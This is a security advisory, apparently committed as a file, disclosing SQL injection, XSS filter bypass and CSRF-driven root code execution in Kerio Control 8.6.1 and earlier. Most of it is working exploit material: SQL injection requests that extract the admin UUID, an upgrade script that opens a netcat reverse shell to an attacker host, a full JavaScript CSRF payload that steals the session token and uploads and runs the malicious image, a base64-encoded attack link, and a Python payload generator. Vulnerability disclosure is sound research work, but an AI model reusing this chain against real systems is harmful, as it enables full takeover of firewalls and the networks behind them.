@@ -1,0 +1,444 @@
+IntelliSec Security Advisory
+
+==============================================================================================
+
+Title: 			Multiple Vulnerabilities in Kerio Control (Virtual Appliance)
+
+Vulnerabilities:	SQL Injection, Remote Code Execution through CSRF
+
+Product: 		Kerio Control 
+Homepage: 		http://www.kerio.com
+Affected Version: 	<= 8.6.1
+Fixed Version: 		8.6.2 (partially fixed)
+Impact: 		critical
+Date:			2015-10-12
+
+Author: 		Raschin Tavakoli | IntelliSec Research 
+                     	http://www.intellisec.at
+	 		research@intellisec.at
+
+Links:			https://youtu.be/EzTI2WlGHb4
+
+===============================================================================================
+
+Vendor description:
+===================
+
+Kerio Control is a unified threat management firewall developed by Kerio Technologies. It 
+features intrusion prevention, content filtering, activity reporting, bandwidth management, 
+and virtual private networking. Kerio Control runs Linux, providing network perimeter defense 
+for small to medium organizations. 
+
+Vulnerabilities
+===============
+1. XSS with Anti-XSS-Filter bypass (nonauth area)
+2. SQL Injection (non-admin area) 
+3. Remote Code Execution (admin area)
+
+By chaining the vulnerabilities together in combination with user interaction, an attacker may 
+gain full control over the firewall and the underlying network.
+
+
+Attack Scenario
+===============
+
+The first attack could be to trick non-admin users to follow a malicious link in order to trigger 
+a CSRF exploit via the /nonauth/certificate.php script. The script may exploit the SQL Injection 
+flaw in reports.php for example. 
+Once able to query the database, sensitive data of the users can be transmitted back to the 
+attacker. Information of interest could be for example the traffic usage of admin users and their 
+top-visited webpages.
+
+In the next attack, this information may be used to embed another CSRF exploit into one of 
+the top-visited webpages.  If the attacker succeeds and the exploit gets triggered by a visiting 
+admin, arbitrary remote code execution will be gained.
+
+===============================================================================================
+1. SQL Injection:
+===============================================================================================
+
+Short Description:
+==================
+
+Kerio Control suffers from an SQL Injection flaw in the report.php script. 
+
+Detailed Description:
+=====================
+
+It is not necessary to use blind sql injection, as the output will be rendered into an image file. 
+As the text in the image file has a fixed size, multiple union selects can be combined to render out 
+multiple images containing the result text of the query.
+
+In order to exploit the issue, a user has to be authenticated. For non-admin users, webreports 
+have to be enabled. 
+
+This issue is fixed in 8.6.2
+
+Proof of Concept:
+=================
+
+GET /report.php?id=1'+OR+'1'%3d'1'%3b+-- HTTP/1.1
+Host: testbox:4081
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.8.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: SESSION_CONTROL_WEBIFACE=c0fa6c207d812da1fce3e2ff2bc2e609948988a041f5a23adb64064a42010e6b; 
+TOKEN_CONTROL_WEBIFACE
+
+For example, to read out the admin's internal UUID number, the following union based sql injection 
+can be used:
+
+https://testbox:4081/report.php?start=16703, 0, 0) UNION SELECT 'x', 'Admin UUID: ' || 
+substring(cast( (select UUID from USER_LIST WHERE USERNAME='Admin') as varchar(256)) 
+from 1 for 14), REQUESTS FROM GET_ALL_TOP_WEBS_D(16703, 1) UNION SELECT 'y', substring(cast( 
+(select UUID from USER_LIST WHERE USERNAME='Admin')  as varchar(256)) from 15 for 40),  '7' 
+FROM GET_ALL_TOP_WEBS_D(16703, 1);+--+&end=16703&id=0'+OR+USERNAME='Admin';+--+
+
+=======================
+2. Cross Site Scripting
+=======================
+
+The server parameter in the nonauth/certificate.php script suffers from an non persistent XSS 
+vulnerability. The payload needs to be base64 encoded and will be decoded at runtime. That way
+it bypasses all Anti-XSS Filters of modern browsers, which increases the severity of this issue
+significantly.
+
+The issue has been tested with OS X Chrome Version 45.0.2454.101, OS X Safari Version 9.0 
+(10601.1.56.2), Linux Chromium Version 37.0.2062.120 and Linux Iceweasel 31.8.0
+
+This issue is fixed in 8.6.2
+
+===============================================================================================
+3. Remote Command Execution via File Upload
+===============================================================================================
+
+Short Description:
+==================
+
+Kerio Control suffers from a RCE vulnerability in the upgrade function in the admin interface. 
+A malicious ssh script can be uploaded and executed with root privileges.
+
+Detail:	
+=======
+
+The upgrade feature in the admin interface can be used to upload arbitrary files by simply 
+changing a tar file to the extension .img. If a tar file is created which contains a upgrade.sh shell 
+script, this script will be executed with root privileges. Kerio did not provide a fix for the 
+upgrade functionality yet.
+
+========================================
+4. Remote Command Execution through CSRF 
+========================================
+
+The Kerio admin interface does not provide a functionality to execute shell commands on the 
+underlying Linux system nor a possibility to enable ssh. SSH is disabled by default and can 
+only be enabled through the Kerio Console Application. 
+
+By combining the RCE with an CSRF attack, this vulnerability becomes a serious issue. 
+
+
+Proof of Concept:
+=================
+
+Create a Bash Script:
+---------------------
+# cat upgrade.sh
+# #!/bin/bash
+# nc 10.0.0.2 5555 -e /bin/bash &
+
+# tar czf upgrade.tar.gz *
+# mv upgrade.tar.gz upgrade.img
+
+Open a netcat listener on the attacker's machine 10.0.0.2:
+----------------------------------------------------------
+# nc -lvp 5555
+
+Generate Javascript Payload (File Upload and Execution):
+--------------------------------------------------------
+<script>
+url='http://10.0.0.1:4081/admin';
+_token="";
+_file="";
+_id = "";
+function reqListener () {
+	obj = JSON.parse(this.responseText);
+	file = obj.result.fileUpload.name;
+	id = obj.result.fileUpload.id;
+	createIFrame(file, id);
+}
+function createIFrame(file, id) {
+	iframe=document.createElement("iframe");
+	iframe.src=url + "/constants.js.php";
+	iframe.style.display = "none";
+	iframe.sandbox="allow-scripts allow-same-origin";
+	iframe.onload=function() {
+		cookie = iframe.contentWindow.document.cookie;
+		var re = new RegExp(name + "=([^;]+)");
+		var value = re.exec(cookie);
+		var token=(value != null) ? unescape(value[1]) : null;
+		executeScript(file, id, token);
+	}
+	document.body.appendChild(iframe);
+}
+function executeScript(file, id, token) {
+	_file = file;
+	_id = id;
+	_token = token;
+	var xmlhttp=new XMLHttpRequest();xmlhttp.open("POST", url + "/api/jsonrpc/", true);
+	xmlhttp.setRequestHeader("X-Token", token);
+	xmlhttp.addEventListener("load", executeScript2);
+	xmlhttp.setRequestHeader("X-Requested-With", "XMLHttpRequest");
+	xmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+	xmlhttp.send(JSON.stringify({"jsonrpc":"2.0","id":1,"method":"UpdateChecker.uploadImage","params":{"fileId": file}}));
+}
+function executeScript2(file, token) {
+	var xmlhttp=new XMLHttpRequest();xmlhttp.open("POST", url +"/api/jsonrpc/", true);
+	xmlhttp.setRequestHeader("X-Token", _token);
+	xmlhttp.setRequestHeader("X-Requested-With", "XMLHttpRequest");
+	xmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+	xmlhttp.send(JSON.stringify({"jsonrpc":"2.0","id":1,"method":"UpdateChecker.performCustomUpgrade","params":{"id": _id }}));
+}
+var xhr = new XMLHttpRequest();
+xhr.open("POST", url + "/api/jsonrpc/upload/", true);
+xhr.addEventListener("load", reqListener);
+xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------1038495162429835808207612951");
+xhr.withCredentials = true;
+var body = "-----------------------------1038495162429835808207612951\r\n" + 
+"Content-Disposition: form-data; name=\"uploadImage\"; filename=\"upgrade.img\" \r\n" + 
+"Content-Type: application/octet-stream\r\n" + 
+"\r\n" + 
+"\x1f\x8b\x08\x00\xe0\x6e\x02\x56\x00\x03\xed\xce\xb1\x0e\x82\x30\x10\xc6\xf1\xce\x3c\xc5\x19\x13\x37\xe1\x8a\x2d\x3e\x4f\x51\x22\x2e\x60\x5a\x78\x7f\xab\x83\x24\x0e\x3a\x11\x63\xf2\xff\xdd\xf0\x25\xf7\xdd\x70\xf3\xed\x12\xc3\xb9\x2b\x53\x6f\x56\xa3\x59\xe3\xdc\x33\xb3\xf7\x54\xf5\xce\xd8\xba\x51\x75\xcd\xf1\xe0\xf2\xde\x5a\x9f\x43\x74\xbd\x97\x16\x73\x9a\x42\x14\x31\x71\x1c\xa7\x4f\x77\xdf\xfa\x3f\xb5\xdd\x54\xed\x75\xa8\xda\x90\xfa\x62\x38\x89\xd5\xf2\x31\xb5\xf8\x4c\xf6\x9d\xbc\x5a\xd9\x15\xbf\xfe\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb0\xb8\x03\x94\x67\x18\xfa\x00\x28\x00\x00\r\n" + 
+"-----------------------------1038495162429835808207612951--\r\n";
+var aBody = new Uint8Array(body.length);
+for (var i = 0; i < aBody.length; i++)
+aBody[i] = body.charCodeAt(i); 
+xhr.send(new Blob([aBody]));
+</script>
+
+Base64 encode and craft malicous link:
+
+https://testbox:4081/nonauth/certificate.php?server=PHNjcmlwdD4KdXJsPSdodHRwOi8vMTAuMC4wLjE6NDA4MS9hZG1pbic7Cl90b2tlbj0iIjsKX2Zp
+bGU9IiI7Cl9pZCA9ICIiOwpmdW5jdGlvbiByZXFMaXN0ZW5lciAoKSB7CglvYmogPSBKU09OLnBh
+cnNlKHRoaXMucmVzcG9uc2VUZXh0KTsKCWZpbGUgPSBvYmoucmVzdWx0LmZpbGVVcGxvYWQubmFt
+ZTsKCWlkID0gb2JqLnJlc3VsdC5maWxlVXBsb2FkLmlkOwoJY3JlYXRlSUZyYW1lKGZpbGUsIGlk
+KTsKfQpmdW5jdGlvbiBjcmVhdGVJRnJhbWUoZmlsZSwgaWQpIHsKCWlmcmFtZT1kb2N1bWVudC5j
+cmVhdGVFbGVtZW50KCJpZnJhbWUiKTsKCWlmcmFtZS5zcmM9dXJsICsgIi9jb25zdGFudHMuanMu
+cGhwIjsKCWlmcmFtZS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwoJaWZyYW1lLnNhbmRib3g9ImFs
+bG93LXNjcmlwdHMgYWxsb3ctc2FtZS1vcmlnaW4iOwoJaWZyYW1lLm9ubG9hZD1mdW5jdGlvbigp
+IHsKCQljb29raWUgPSBpZnJhbWUuY29udGVudFdpbmRvdy5kb2N1bWVudC5jb29raWU7CgkJdmFy
+IHJlID0gbmV3IFJlZ0V4cChuYW1lICsgIj0oW147XSspIik7CgkJdmFyIHZhbHVlID0gcmUuZXhl
+Yyhjb29raWUpOwoJCXZhciB0b2tlbj0odmFsdWUgIT0gbnVsbCkgPyB1bmVzY2FwZSh2YWx1ZVsx
+XSkgOiBudWxsOwoJCWV4ZWN1dGVTY3JpcHQoZmlsZSwgaWQsIHRva2VuKTsKCX0KCWRvY3VtZW50
+LmJvZHkuYXBwZW5kQ2hpbGQoaWZyYW1lKTsKfQpmdW5jdGlvbiBleGVjdXRlU2NyaXB0KGZpbGUs
+IGlkLCB0b2tlbikgewoJX2ZpbGUgPSBmaWxlOwoJX2lkID0gaWQ7CglfdG9rZW4gPSB0b2tlbjsK
+CXZhciB4bWxodHRwPW5ldyBYTUxIdHRwUmVxdWVzdCgpO3htbGh0dHAub3BlbigiUE9TVCIsIHVy
+bCArICIvYXBpL2pzb25ycGMvIiwgdHJ1ZSk7Cgl4bWxodHRwLnNldFJlcXVlc3RIZWFkZXIoIlgt
+VG9rZW4iLCB0b2tlbik7Cgl4bWxodHRwLmFkZEV2ZW50TGlzdGVuZXIoImxvYWQiLCBleGVjdXRl
+U2NyaXB0Mik7Cgl4bWxodHRwLnNldFJlcXVlc3RIZWFkZXIoIlgtUmVxdWVzdGVkLVdpdGgiLCAi
+WE1MSHR0cFJlcXVlc3QiKTsKCXhtbGh0dHAuc2V0UmVxdWVzdEhlYWRlcigiQ29udGVudC1UeXBl
+IiwgImFwcGxpY2F0aW9uL2pzb247Y2hhcnNldD1VVEYtOCIpOwoJeG1saHR0cC5zZW5kKEpTT04u
+c3RyaW5naWZ5KHsianNvbnJwYyI6IjIuMCIsImlkIjoxLCJtZXRob2QiOiJVcGRhdGVDaGVja2Vy
+LnVwbG9hZEltYWdlIiwicGFyYW1zIjp7ImZpbGVJZCI6IGZpbGV9fSkpOwp9CmZ1bmN0aW9uIGV4
+ZWN1dGVTY3JpcHQyKGZpbGUsIHRva2VuKSB7Cgl2YXIgeG1saHR0cD1uZXcgWE1MSHR0cFJlcXVl
+c3QoKTt4bWxodHRwLm9wZW4oIlBPU1QiLCB1cmwgKyIvYXBpL2pzb25ycGMvIiwgdHJ1ZSk7Cgl4
+bWxodHRwLnNldFJlcXVlc3RIZWFkZXIoIlgtVG9rZW4iLCBfdG9rZW4pOwoJeG1saHR0cC5zZXRS
+ZXF1ZXN0SGVhZGVyKCJYLVJlcXVlc3RlZC1XaXRoIiwgIlhNTEh0dHBSZXF1ZXN0Iik7Cgl4bWxo
+dHRwLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtVHlwZSIsICJhcHBsaWNhdGlvbi9qc29uO2No
+YXJzZXQ9VVRGLTgiKTsKCXhtbGh0dHAuc2VuZChKU09OLnN0cmluZ2lmeSh7Impzb25ycGMiOiIy
+LjAiLCJpZCI6MSwibWV0aG9kIjoiVXBkYXRlQ2hlY2tlci5wZXJmb3JtQ3VzdG9tVXBncmFkZSIs
+InBhcmFtcyI6eyJpZCI6IF9pZCB9fSkpOwp9CnZhciB4aHIgPSBuZXcgWE1MSHR0cFJlcXVlc3Qo
+KTsKeGhyLm9wZW4oIlBPU1QiLCB1cmwgKyAiL2FwaS9qc29ucnBjL3VwbG9hZC8iLCB0cnVlKTsK
+eGhyLmFkZEV2ZW50TGlzdGVuZXIoImxvYWQiLCByZXFMaXN0ZW5lcik7Cnhoci5zZXRSZXF1ZXN0
+SGVhZGVyKCJBY2NlcHQiLCAidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNh
+dGlvbi94bWw7cT0wLjksKi8qO3E9MC44Iik7Cnhoci5zZXRSZXF1ZXN0SGVhZGVyKCJBY2NlcHQt
+TGFuZ3VhZ2UiLCAiZW4tVVMsZW47cT0wLjUiKTsKeGhyLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRl
+bnQtVHlwZSIsICJtdWx0aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0tLS0tLS0tLS0tLS0tLS0t
+LS0tLS0tLS0tLS0xMDM4NDk1MTYyNDI5ODM1ODA4MjA3NjEyOTUxIik7Cnhoci53aXRoQ3JlZGVu
+dGlhbHMgPSB0cnVlOwp2YXIgYm9keSA9ICItLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTEw
+Mzg0OTUxNjI0Mjk4MzU4MDgyMDc2MTI5NTFcclxuIiArIAoiQ29udGVudC1EaXNwb3NpdGlvbjog
+Zm9ybS1kYXRhOyBuYW1lPVwidXBsb2FkSW1hZ2VcIjsgZmlsZW5hbWU9XCJ1cGdyYWRlLmltZ1wi
+IFxyXG4iICsgCiJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbVxyXG4iICsg
+CiJcclxuIiArIAoiXHgxZlx4OGJceDA4XHgwMFx4YWJceDZmXHgwMlx4NTZceDAwXHgwM1x4ZWRc
+eGNlXHhiMVx4MGVceDgyXHg0MFx4MTBceDg0XHhlMVx4YWJceDc5XHg4YVx4MzVceDI2XHg3Nlx4
+YzJceDFlXHhkZVx4MWRceGNmXHgwM1x4NGFceGM0XHgwNlx4Y2NceDFkXHhiY1x4M2ZceDY4XHgy
+MVx4ODlceDg1XHg1Nlx4YzRceDk4XHhmY1x4ZGZceDE2XHg1M1x4Y2NceDE2XHgzM1x4ZGRceGFm
+XHhiMVx4YmVceGI0XHg3OVx4ZWFceGNjXHg2Nlx4NzRceDExXHg5Y1x4N2JceGU2XHhlMlx4M2Rc
+eDU1XHhiZFx4MzNceGI2XHgwY1x4YWFceDJlXHg1NFx4YzFceDlmXHg4Y1x4NWFceGViXHg1ZFx4
+NjVceDQ0XHhiN1x4OWJceGI0XHg5YVx4ZDJceDU4XHg0N1x4MTFceDEzXHg4N1x4NjFceGZjXHhm
+NFx4ZjdceGFkXHhmZlx4NTNceGZiXHg1ZFx4ZDFceGRjXHhmYVx4YTJceGE5XHg1M1x4OTdceGY1
+XHg2N1x4YjFceDlhXHgzZlx4YWVceDE0XHhiZlx4OTBceDYzXHgyYlx4YWZceDU2XHgwZVx4ZDlc
+eGFmXHhiN1x4MDJceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4
+MDBceDAwXHg1Nlx4MzNceGNmXHhiMlx4M2JceDZjXHgwMFx4MjhceDAwXHgwMFxyXG4iICsgCiIt
+LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTEwMzg0OTUxNjI0Mjk4MzU4MDgyMDc2MTI5NTEt
+LVxyXG4iOwp2YXIgYUJvZHkgPSBuZXcgVWludDhBcnJheShib2R5Lmxlbmd0aCk7CmZvciAodmFy
+IGkgPSAwOyBpIDwgYUJvZHkubGVuZ3RoOyBpKyspCmFCb2R5W2ldID0gYm9keS5jaGFyQ29kZUF0
+KGkpOyAKeGhyLnNlbmQobmV3IEJsb2IoW2FCb2R5XSkpOwo8L3NjcmlwdD4K
+
+
+Python 3 payload generator
+==========================
+For easier testing, we developed a small python script that can be used to 
+generate the payload:
+
+#!/usr/bin/python
+
+# ====================================================================== #
+# Title:  Remote Command Execution through CSRF - Payload Generator      #
+# Author: Raschin Tavakoli - IntelliSec GmbH                             #
+# Date: 12.10.2015                                                       #
+#                                                                        #
+# Description:                                                           #
+# This python3 script generates the payload to exploit the RCE via CSRF  #
+# vulnerability in the Kerio Control Virtual Appliance.                  #
+#                                                                        #
+# First a shell script will be packed as an Kerio upgrade.img file. Then #
+# a Javascript will be generated which uploads the file via the Kerio    #
+# upgrade function. The payload will then be base64 encoded and can be   #
+# injected into the server parameter of the                              #
+# nonauth/certificate.php script ().                                     #
+#                                                                        #
+# Example Usage:                                                         #
+# csrf-gen-payload.py -t https://10.0.0.8:4081/admin -l 10.0.0.7 -p 5555 #
+# ====================================================================== #
+
+import os
+import shutil
+import base64
+import argparse
+import subprocess
+from optparse import OptionParser
+import codecs
+import sys
+
+tmpdir = "/tmp/kerio_upgrade"
+
+def usage():
+    print ("\nUsage: csrf-gen-payload -f <file> -t <target-url> \n")
+    print("Example: csrf-gen-payload.py -f upgrade.sh -t https://10.0.0.8:4081/admin \n")
+    exit()
+
+def main():
+
+    parser = OptionParser()
+    parser.add_option("-f", "--file", dest="file",
+                  help="the bash file for remote execution", metavar="TARGET")
+    parser.add_option("-t", "--target", dest="target_url",
+                  help="specify the target url", metavar="TARGET")
+
+    (options, args) = parser.parse_args()
+
+    file = options.file
+    target_url = options.target_url	
+
+    if not target_url or not file:
+        usage()
+
+    # ====================================================================== #
+    # Create upgrade.img file                                                #
+    # ====================================================================== #
+    orgdir = os.path.dirname(os.path.realpath(__file__))
+
+    try:
+        if os.path.exists(tmpdir):
+            shutil.rmtree(tmpdir)
+    except:
+        print("Cannot clean " + tmpdir)
+
+    os.mkdir(tmpdir)
+
+    shutil.copy(file, tmpdir + os.path.sep + "upgrade.sh")
+    os.chdir(tmpdir)
+    os.system("tar czf upgrade.tar.gz *")
+    src = os.path.join(tmpdir, "upgrade.tar.gz")
+    dst = os.path.join(tmpdir, "upgrade.img")
+    os.rename(src, dst)
+
+    f = open('upgrade.img', 'rb',)
+    bin_data = f.read()
+    f.close()
+
+    hexdata = "".join("\\x{:02x}".format(c) for c in bin_data)
+
+    # ====================================================================== #
+    # Generate Javascript Payload                                            #
+    # ====================================================================== #
+    script = ('<script>\n' +
+              'url=\'' + target_url +
+              '\';\n' +
+              '_token="";\n' +
+              '_file="";\n' +
+              '_id = "";\n' +
+              'function reqListener () {\n' +
+              '\tobj = JSON.parse(this.responseText);\n' +
+              '\tfile = obj.result.fileUpload.name;\n' +
+              '\tid = obj.result.fileUpload.id;\n' +
+              '\tcreateIFrame(file, id);\n' +
+              '}\n' +
+              'function createIFrame(file, id) {\n' +
+              '\tiframe=document.createElement("iframe");\n' +
+              '\tiframe.src=url + "/constants.js.php";\n' +
+              '\tiframe.style.display = "none";\n' +
+              '\tiframe.sandbox="allow-scripts allow-same-origin";\n' +
+              '\tiframe.onload=function() {\n' +
+              '\t\tcookie = iframe.contentWindow.document.cookie;\n' +
+              '\t\tvar re = new RegExp(name + "=([^;]+)");\n' +
+              '\t\tvar value = re.exec(cookie);\n' +
+              '\t\tvar token=(value != null) ? unescape(value[1]) : null;\n' +
+              '\t\texecuteScript(file, id, token);\n' +
+              '\t}\n' +
+              '\tdocument.body.appendChild(iframe);\n' +
+              '}\n' +
+              'function executeScript(file, id, token) {\n' +
+              '\t_file = file;\n' +
+              '\t_id = id;\n' +
+              '\t_token = token;\n' +
+              '\tvar xmlhttp=new XMLHttpRequest();xmlhttp.open("POST", url + "/api/jsonrpc/", true);\n' +
+              '\txmlhttp.setRequestHeader("X-Token", token);\n' +
+              '\txmlhttp.addEventListener("load", executeScript2);\n' +
+              '\txmlhttp.setRequestHeader("X-Requested-With", "XMLHttpRequest");\n' +
+              '\txmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");\n' +
+              '\txmlhttp.send(JSON.stringify({"jsonrpc":"2.0","id":1,"method":"UpdateChecker.uploadImage","params":{"fileId": file}}));\n' +
+              '}\n' +
+              'function executeScript2(file, token) {\n' +
+              '\tvar xmlhttp=new XMLHttpRequest();xmlhttp.open("POST", url +"/api/jsonrpc/", true);\n' +
+              '\txmlhttp.setRequestHeader("X-Token", _token);\n' +
+              '\txmlhttp.setRequestHeader("X-Requested-With", "XMLHttpRequest");\n' +
+              '\txmlhttp.setRequestHeader("Content-Type", "application/json;charset=UTF-8");\n' +
+              '\txmlhttp.send(JSON.stringify({"jsonrpc":"2.0","id":1,"method":"UpdateChecker.performCustomUpgrade","params":{"id": _id }}));\n' +
+              '}\n' +
+              'var xhr = new XMLHttpRequest();\n' +
+              'xhr.open("POST", url + "/api/jsonrpc/upload/", true);\n' +
+              'xhr.addEventListener("load", reqListener);\n' +
+              'xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");\n' +
+              'xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");\n' +
+              'xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------1038495162429835808207612951");\n' +
+              'xhr.withCredentials = true;\n' +
+              'var body = "-----------------------------1038495162429835808207612951\\r\\n" + \n' +
+              '"Content-Disposition: form-data; name=\\"uploadImage\\"; filename=\\"upgrade.img\\" \\r\\n" + \n' +
+              '"Content-Type: application/octet-stream\\r\\n" + \n' +
+              '"\\r\\n" + \n' +
+
+              '"' + hexdata + '\\r\\n" + \n' +
+
+              '"-----------------------------1038495162429835808207612951--\\r\\n";\n' +
+              'var aBody = new Uint8Array(body.length);\n' +
+              'for (var i = 0; i < aBody.length; i++)\n' +
+              'aBody[i] = body.charCodeAt(i); \n' +
+              'xhr.send(new Blob([aBody]));\n' +
+              '</script>')
+
+    print(script)
+
+    os.chdir(orgdir)
+    shutil.rmtree(tmpdir)
+
+if __name__ == '__main__':
+    main()
+
+
+
+
+
